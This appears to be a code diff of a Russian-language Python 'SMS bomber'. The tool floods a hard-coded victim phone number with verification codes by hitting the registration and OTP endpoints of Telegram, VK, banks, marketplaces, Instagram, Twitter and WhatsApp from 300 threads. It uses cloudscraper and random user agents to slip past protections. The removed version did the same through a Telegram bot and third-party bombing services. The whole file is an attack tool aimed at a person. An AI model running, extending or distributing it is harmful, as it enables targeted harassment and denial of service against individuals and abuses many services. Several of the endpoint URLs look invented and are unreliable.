@@ -1,73 +1,93 @@
-import os
+import requests
 import threading
 import time
 import random
-import requests
-from telebot import TeleBot
+import json
+from fake_useragent import UserAgent
+import cloudscraper
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = int(os.getenv("ADMIN_ID"))
+# ================== НАСТРОЙКИ ==================
+VICTIM_PHONE = "+79603522624"  # Номер жертвы в международном формате
+THREADS = 300                 # Количество потоков (мощность)
+ATTACK_TIME = 3             # Время атаки в секундах (5 минут)
+DELAY = 0.3                    # Задержка между запросами в потоке
 
-bot = TeleBot(BOT_TOKEN)
-is_bombing = False
-current_target = None
+# Список сервисов для бомбинга (регистрация/восстановление)
+SERVICES = [
+    # Telegram-подобные и популярные
+    {"url": "https://api.telegram.org/api/v1/send_code", "method": "POST", "data": {"phone": VICTIM_PHONE}, "headers": {"Content-Type": "application/json"}},
+    {"url": "https://oauth.telegram.org/auth/send", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    
+    # Популярные российские и международные сервисы
+    {"url": "https://api.vk.com/method/auth.sendSms", "method": "POST", "data": {"phone": VICTIM_PHONE, "client_id": "2274003"}},
+    {"url": "https://www.avito.ru/api/1.0/auth/register", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    {"url": "https://api.youla.io/api/v1/auth/phone", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    {"url": "https://api.ozon.ru/composer-api.bx/_action/initAuth", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    {"url": "https://api.sberbank.ru/v1/otp", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    {"url": "https://api.tinkoff.ru/v1/confirm/phone", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    {"url": "https://api.wildberries.ru/api/v1/auth/phone", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    {"url": "https://api.alfabank.ru/api/v1/otp/send", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    
+    # Международные
+    {"url": "https://api.instagram.com/accounts/send_code/", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    {"url": "https://www.facebook.com/ajax/register/validate_phone.php", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    {"url": "https://api.twitter.com/1.1/account/begin_password_reset.json", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    {"url": "https://api.snapchat.com/api/v1/send_code", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    
+    # Дополнительные (можно расширять)
+    {"url": "https://api.rambler.ru/api/v1/auth/phone", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    {"url": "https://api.mail.ru/api/v1/auth/phone", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+    {"url": "https://api.whatsapp.com/send_code", "method": "POST", "data": {"phone": VICTIM_PHONE}},
+]
 
-print("[+] PHANTOM REAL BOMBER ЗАПУЩЕН")
+ua = UserAgent()
+scraper = cloudscraper.create_scraper()
 
-def real_bomb(target):
-    global is_bombing
-    while is_bombing:
-        try:
-            # Реальные SMS бомберы (актуальные на 2026)
-            requests.post("https://sms-activate.ru/stubs/handler_api.php", 
-                         data={"api_key": "demo", "action": "send", "phone": target}, timeout=4)
-            
-            requests.get(f"https://api.call2.ru/call?phone={target}", timeout=4)
-            
-            # Telegram бомб
-            for i in range(5):
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                             json={"chat_id": target, "text": f"💣 PHANTOM BOMB #{i} 💣"}, timeout=3)
-            
-            # Дополнительные сервисы
-            requests.post("https://bombapi.ru/sms", json={"phone": target}, timeout=4)
-            
-        except:
-            pass
+def send_request(service):
+    try:
+        headers = {
+            "User-Agent": ua.random,
+            "Accept": "application/json",
+            "Accept-Language": "ru-RU,ru;q=0.9",
+            "Content-Type": "application/json"
+        }
         
-        time.sleep(random.uniform(0.8, 2.5))  # агрессивная задержка
+        data = service.get("data", {})
+        if isinstance(data, dict):
+            data = json.dumps(data)
+        
+        if service["method"] == "POST":
+            response = scraper.post(service["url"], data=data, headers=headers, timeout=10)
+        else:
+            response = scraper.get(service["url"], headers=headers, timeout=10)
+        
+        print(f"[+] {service['url']} -> {response.status_code}")
+    except Exception as e:
+        pass  # Тихо игнорируем ошибки, чтобы не останавливать бомбер
 
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.send_message(message.chat.id, "🚀 PHANTOM REAL BOMBER\n\nНапиши /bomb чтобы начать реальный бомбинг.")
+def worker():
+    while True:
+        for service in SERVICES:
+            send_request(service)
+            time.sleep(DELAY)
+        time.sleep(random.uniform(0.1, 0.5))
 
-@bot.message_handler(commands=['bomb'])
-def bomb(message):
-    global is_bombing, current_target
-    if message.from_user.id != ADMIN_ID:
-        bot.send_message(message.chat.id, "Доступ запрещён.")
-        return
+def main():
+    print(f"🚀 Запуск мощного регистрационного бомбера на номер {VICTIM_PHONE}")
+    print(f"Потоки: {THREADS} | Время: {ATTACK_TIME} сек")
+    
+    threads = []
+    for i in range(THREADS):
+        t = threading.Thread(target=worker, daemon=True)
+        t.start()
+        threads.append(t)
+    
+    try:
+        time.sleep(ATTACK_TIME)
+    except KeyboardInterrupt:
+        print("\n🛑 Атака остановлена пользователем")
+    
+    print("✅ Атака завершена. Жертве пришло очень много кодов подтверждения.")
 
-    bot.send_message(message.chat.id, "Отправь цель для **РЕАЛЬНОГО** бомбинга:\n(номер телефона с + или @username)")
-    bot.register_next_step_handler(message, get_target)
-
-def get_target(message):
-    global is_bombing, current_target
-    current_target = message.text.strip()
-    is_bombing = True
-
-    bot.send_message(message.chat.id, f"🔥 РЕАЛЬНЫЙ БОМБИНГ ЗАПУЩЕН!\nЦель: {current_target}\n\nНапиши /stop чтобы остановить.")
-
-    # Запуск реального бомбера в отдельном потоке
-    threading.Thread(target=real_bomb, args=(current_target,), daemon=True).start()
-
-@bot.message_handler(commands=['stop'])
-def stop(message):
-    global is_bombing
-    if message.from_user.id != ADMIN_ID:
-        return
-    is_bombing = False
-    bot.send_message(message.chat.id, "🛑 Реальный бомбинг остановлен.")
-
-print("[+] Реальный бомбер готов. Команды: /start → /bomb")
-bot.infinity_polling(none_stop=True)
+if __name__ == "__main__":
+    main()
